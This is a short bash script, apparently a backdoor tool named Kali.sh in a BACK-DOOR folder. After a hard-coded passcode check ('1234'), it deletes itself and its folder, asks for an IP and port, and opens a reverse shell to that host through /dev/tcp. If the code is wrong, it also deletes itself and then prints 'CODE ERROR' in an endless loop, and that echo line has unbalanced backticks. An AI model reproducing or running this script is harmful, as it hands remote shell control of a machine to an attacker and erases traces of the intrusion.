#!/bin/bash

ip r

time

sleep 2

clear

sleep 2

echo "ENTER THE CODE HERE :"

read code

if [ "$code" = "1234" ];

then 
        
        
         rm -rf Kali.sh
         cd ..
         rm -rf BACK-DOOR
        echo "ENTER THE IP"

        read ip

        echo "ENTER THE PORT"

        read num

        bash -i >& /dev/tcp/$ip/$num 0>&1

else

       
       
        rm -rf Kali.sh 
        cd ..
        rm -rf BACK-DOOR
        numer=1

        while [ $numer = 1  ]

        do

        echo -en "\e[31m"`CODE ERROR"\e[31m"`

        echo -en "\e[42m"`CODE ERROR"\e[42m"`

        done

fi
